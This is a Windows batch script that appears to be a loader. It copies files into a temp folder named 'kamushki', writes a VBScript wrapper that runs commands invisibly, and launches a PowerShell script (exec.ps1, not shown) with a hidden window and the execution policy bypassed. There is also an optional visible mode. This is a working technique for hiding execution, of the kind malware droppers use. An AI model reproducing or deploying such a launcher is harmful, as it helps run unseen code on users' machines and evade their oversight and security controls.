@echo off

goto variables

:variables
setlocal
set "programDir=%temp%\kamushki"
set "dataDir=%programDir%"
set "powershellExecutablePath=%dataDir%\exec.ps1"
set "runPath=%programDir%\run.vbs"

:: Create necessary directories and copy files
md "%dataDir%" 2>nul
copy "%cd%\data" "%dataDir%" /Y >nul
goto create

:create
cls
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo Dim command
    echo For Each arg In WScript.Arguments
    echo     command = command ^& " " ^& arg
    echo Next
    echo WshShell.Run "cmd.exe /c " ^& command, 0, True
) > "%runPath%"
goto launch

:launch
cls
cd "%programDir%"
start /B /I run.vbs "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File %powershellExecutablePath%"
exit /b 0

:launchvisible
cls
echo PowerShell Launcher
echo @pechenis
start /B /I powershell.exe -ExecutionPolicy Bypass -File "%powershellExecutablePath%"
pause

exit /b 0